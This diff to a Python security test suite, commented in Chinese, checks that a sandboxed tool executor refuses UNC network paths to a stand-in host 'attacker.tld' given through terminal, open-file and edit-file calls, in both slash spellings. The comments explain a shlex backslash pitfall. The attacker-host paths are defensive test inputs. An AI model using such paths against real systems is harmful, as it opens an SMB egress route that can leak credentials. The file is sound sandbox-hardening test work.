@@ -12922,13 +12922,23 @@ if _want("70"):
           and bool(_SDLR70(Path.home() / ".ssh")),
           (_SENS70("C:/Windows"), _SDLR70("C:/Windows"), _SDLR70(Path.home() / ".ssh")))
     # c) 文件路径也是一条出网通道，而出网闸门（egress_allowlist）只管 URL
+    # 两种拼法都要测，原因与 H-15 那条**同一类**平台不对称（CI 第一次跑就抓到这条）：
+    # `terminal_view` 在 POSIX 上走 `shlex.split`，而 shlex **会吃掉反斜杠** ——
+    # `\\attacker.tld\share` 被解析成 `\attacker.tldshare`（只剩一个前导反斜杠），
+    # 于是那条命令在 Linux 上压根不是在测 UNC（本机 Windows 全绿、CI 单条红）。
+    # 正斜杠那种拼法两边都能原样穿过；反斜杠那半在 open_file / edit_file 上不经过 shell
+    # 分词，所以两种拼法 × 三个工具都该被拦。
+    _unc70 = (r"\\attacker.tld\share", "//attacker.tld/share")
+    _bad70h29 = []
+    for _u70 in _unc70:
+        for _t70, _call70 in (
+                ("terminal_view", {"tool": "terminal_view", "command": f"ls {_u70}"}),
+                ("open_file", {"tool": "open_file", "path": _u70}),
+                ("edit_file", {"tool": "edit_file", "path": _u70})):
+            if _sv70.execute(_call70).error_code != "403":
+                _bad70h29.append(f"{_t70} {_u70}")
     check("H-29c ★UNC / 设备命名空间一律 403（`exists()` 之前就判，不产生 SMB 连接）",
-          _sv70.execute({"tool": "terminal_view",
-                         "command": r"ls \\attacker.tld\share"}).error_code == "403"
-          and _sv70.execute({"tool": "open_file",
-                             "path": r"\\attacker.tld\share"}).error_code == "403"
-          and _sv70.execute({"tool": "edit_file",
-                             "path": r"\\attacker.tld\share"}).error_code == "403", "")
+          not _bad70h29, _bad70h29)
     check("H-29c 判据本身：UNC 正反例",
           bool(_npr70(r"\\h\s")) and bool(_npr70("//h/s")) and bool(_npr70(r"\\?\C:\x"))
           and _npr70(r"C:\Users\x") is None and _npr70("./rel") is None,
